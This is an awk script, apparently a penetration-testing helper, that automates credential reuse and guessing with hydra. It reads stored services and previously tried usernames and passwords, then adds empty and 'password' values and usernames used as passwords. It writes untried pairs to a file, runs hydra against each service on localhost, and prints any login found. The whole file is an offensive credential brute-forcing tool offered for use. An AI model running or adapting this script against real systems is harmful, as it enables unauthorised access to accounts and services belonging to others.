#!/usr/bin/awk -f
# attempt to reuse credentials using hydra and keep track of usernames and passwords tried
# read and write a separated value file as a database
## pass in parameter "type"

BEGIN {
  tried_db = "credpanda.tried.dat"
  service_db = "services.dat"
  to_try = "to.try"
  # always attempt these ?
  passwords[""] = 1
  passwords["password"] = 1
  FS=":"
  while (getline < service_db) {
    port=$1
    service=$2
    services[port] = service
  }
  close(service_db)
  while (getline < tried_db) {
    port=$1
    service=$2
    user=$3
    password=$4
    users[user] = 1
    passwords[password] = 1
    attempt = port FS service FS user FS password
    tried[attempt] = 1
  }
  close(tried_db)
}
type ~ /u/ { users[$0] = 1; passwords[$0] = 1 } # try usernames as passwords
type ~ /p/ { passwords[$0] = 1 }
END {
  for (port in services) {
    system("rm to.try")
    service = services[port]
    print port, service
    for (user in users) {
      for (password in passwords) {
        attempt = port FS service FS user FS password
        cred = user ":" password # hydra colon for -C
        done = attempt in tried
        if (!done) {
          print cred > to_try
          print attempt >> tried_db
        }
      }
    }
    close(to_try)
    command = "hydra -C to.try " service "://localhost"
    if (service == "ssh") command = command " -t 4"
    print command
    while (command | getline) {
      if ($0 ~ /login:.*password:/){
        print # found a password
      }
    }
  }
}
